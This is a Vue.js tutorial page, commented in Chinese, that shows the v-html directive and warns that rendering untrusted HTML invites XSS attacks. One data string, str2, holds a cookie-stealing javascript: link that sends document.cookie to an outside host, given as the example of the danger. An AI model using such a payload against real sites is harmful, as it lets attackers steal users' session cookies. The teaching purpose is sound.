<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-html指令</title>
    <!--引入Vue-->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!--
        v-html指令：
            1.作用：向指定节点中渲染包含html结构的内容。
            2.与插值语法的区别：
                (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                (2).v-html可以识别html结构。
            3.严重注意：v-html有安全性问题！！！！
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                (2).一定要在可信的内容上使用v-html
    -->
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name"></div>
        <div v-html="str1"></div>
        <div v-html="str2"></div>
    </div>

    <script>
        Vue.config.productionTip=false

        new Vue({
            el:'#root',
            data:{
                name:'尚硅谷',
                //v-text不会解析标签，而是直接将标签当纯文本解析
                str1:'<h3>123</h3>',
                str2:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到资源了</a>'
            }
        })
    </script>
</body>
</html>
